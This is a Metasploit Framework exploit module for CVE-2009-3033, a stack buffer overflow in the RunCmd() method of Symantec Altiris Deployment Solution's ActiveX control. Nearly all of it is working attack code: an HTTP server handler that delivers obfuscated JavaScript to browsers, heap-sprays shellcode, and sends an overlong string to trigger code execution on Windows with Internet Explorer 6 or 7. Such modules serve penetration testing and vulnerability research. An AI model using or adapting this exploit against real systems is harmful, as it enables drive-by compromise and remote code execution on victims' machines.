##
# $Id: symantec_altirisdeployment_runcmd.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Symantec Altiris Deployment Solution ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Symantec Altiris Deployment Solution.
				When sending an overly long string to RunCmd() method of
				AeXNSConsoleUtilities.dll (6.0.0.1426) an attacker may be able to execute arbitrary
				code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2009-3033' ],
					[ 'BID', '37092' ],
					[ 'OSVDB', '60496' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]
				],
			'DisclosureDate' => 'Nov 4 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
			], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		js = %Q|
			try {
				var evil_string = "";
				var index;
				var vulnerable = new ActiveXObject('Altiris.AeXNSConsoleUtilities.1');
				var my_unescape = unescape;
				var shellcode = '#{shellcode}';
				#{js_heap_spray}
				sprayHeap(my_unescape(shellcode), 0x0D0D0D0D, 0x40000);
				for (index = 0; index < 12260; index++) {
					evil_string = evil_string + my_unescape('0x0D0D0D0D');
				}
				vulnerable.RunCMD(evil_string, '');
			} catch( e ) { window.location = 'about:blank' ; }
		|

		opts = {
			'Strings' => true,
			'Symbols' => {
				'Variables' => [
					'vulnerable',
					'shellcode',
					'my_unescape',
					'index',
					'evil_string',
				]
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.update_opts(js_heap_spray.opts)
		js.obfuscate()
		content = %Q|<html>
<body>
<script><!--
#{js}
//</script>
</body>
</html>
|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
